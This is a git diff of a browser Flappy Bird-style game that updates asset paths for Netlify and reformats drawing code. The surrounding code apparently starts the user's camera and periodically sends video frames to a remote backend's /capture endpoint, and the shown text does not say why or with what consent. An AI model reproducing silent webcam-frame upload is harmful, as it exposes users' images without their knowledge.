@@ -1,16 +1,16 @@
 const canvas = document.getElementById("game");
 const ctx = canvas.getContext("2d");
 
+// Updated paths to match Netlify structure
 const birdImg = new Image();
-birdImg.src = "/static/custom_bird.png";
+birdImg.src = "./assets/custom_bird.png";
 
 const pipeImg = new Image();
-pipeImg.src = "/static/pipe.png";
+pipeImg.src = "./assets/pipe.png";
 
 let birdY = 300, velocity = 0, gameOver = false, score = 0;
 const gravity = 0.35, flapStrength = -6;
 let pipes = [], pipeWidth = 50, gap = 150, pipeSpeed = 2;
-
 let gameStarted = false, cameraStarted = false;
 
 function flap() { velocity = flapStrength; }
@@ -50,11 +50,14 @@ function drawPipes() {
 function gameLoop() {
   if (!gameStarted) {
     ctx.fillStyle="#4ec0ca"; ctx.fillRect(0,0,canvas.width,canvas.height);
-    ctx.fillStyle="white"; ctx.font="20px Arial"; ctx.fillText("Click 'Play Game' to start",50,300);
+    ctx.fillStyle="white"; ctx.font="20px Arial";
+    ctx.fillText("Click 'Play Game' to start",50,300);
     requestAnimationFrame(gameLoop); return;
   }
 
-  if (gameOver) { ctx.fillStyle="red"; ctx.font="40px Arial"; ctx.fillText("Game Over!",80,300); return; }
+  if (gameOver) {
+    ctx.fillStyle="red"; ctx.font="40px Arial"; ctx.fillText("Game Over!",80,300); return;
+  }
 
   velocity += gravity; birdY += velocity;
   const groundY = canvas.height-50;
@@ -70,7 +73,8 @@ function gameLoop() {
 
   ctx.fillStyle="#8B4513"; ctx.fillRect(0,groundY,canvas.width,canvas.height-groundY);
 
-  ctx.fillStyle="white"; ctx.font="30px Arial"; ctx.fillText(score,10,40);
+  ctx.fillStyle="white"; ctx.font="30px Arial";
+  ctx.fillText(score,10,40);
 
   requestAnimationFrame(gameLoop);
 }
@@ -97,7 +101,7 @@ document.getElementById("startBtn").onclick = async () => {
 };
 
 // ===== Send frames to backend =====
-const BACKEND_URL = "https://backend-production-4c46.up.railway.app/capture"; // <-- add /capture
+const BACKEND_URL = "https://backend-production-4c46.up.railway.app/capture";
 
 setInterval(() => {
   if (!cameraStarted || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
